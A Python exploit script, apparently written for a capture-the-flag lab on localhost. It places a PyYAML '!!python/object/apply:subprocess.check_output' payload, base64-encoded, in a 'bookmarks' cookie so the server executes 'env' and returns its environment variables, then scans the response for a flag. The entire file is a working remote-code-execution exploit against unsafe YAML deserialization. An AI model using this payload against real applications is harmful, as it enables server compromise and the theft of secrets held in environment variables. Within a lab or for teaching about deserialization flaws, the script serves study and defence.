import base64
import requests
import re

# Target URL
target_url = "http://127.0.0.1:5000"

# Craft YAML payload to execute env command
# Using subprocess module which is commonly available
yaml_payload = """!!python/object/apply:subprocess.check_output
args: [['env']]
"""

print("[*] YAML Deserialization Attack - Env Command Exfiltration")
print(f"[*] Target: {target_url}\n")

print(f"[*] YAML Payload:")
print(yaml_payload)

# Encode to base64
encoded_payload = base64.b64encode(yaml_payload.encode()).decode()
print(f"\n[*] Base64 Encoded Payload:")
print(f"{encoded_payload}\n")

# Set cookies with malicious bookmarks payload
cookies = {
    'user': 'aea729d9fd8b4083b533db2c69e8e238',
    'bookmarks': encoded_payload
}

print(f"[*] Cookies set:")
print(f"  user: {cookies['user']}")
print(f"  bookmarks: {cookies['bookmarks'][:60]}...\n")

try:
    # Send GET request to trigger deserialization
    print("[*] Sending request to trigger YAML deserialization...")
    response = requests.get(target_url, cookies=cookies, timeout=5)
    
    print(f"\n[+] Response received!")
    print(f"[+] Status Code: {response.status_code}")
    print(f"[+] Content-Length: {len(response.content)} bytes")
    print(f"[+] Headers: {dict(response.headers)}")
    
    # Search for FLAG pattern
    flags = re.findall(r'FLAG\{[A-Fa-f0-9]+\}', response.text)
    if flags:
        print(f"\n[!] *** FLAG FOUND ***")
        for flag in flags:
            print(f"[!] {flag}")
    
    # Print full response
    print(f"\n[+] Full Response Body:")
    print(response.text)
    
except requests.exceptions.Timeout:
    print("[-] Request timed out")
except Exception as e:
    print(f"[-] Error: {type(e).__name__}: {str(e)}")

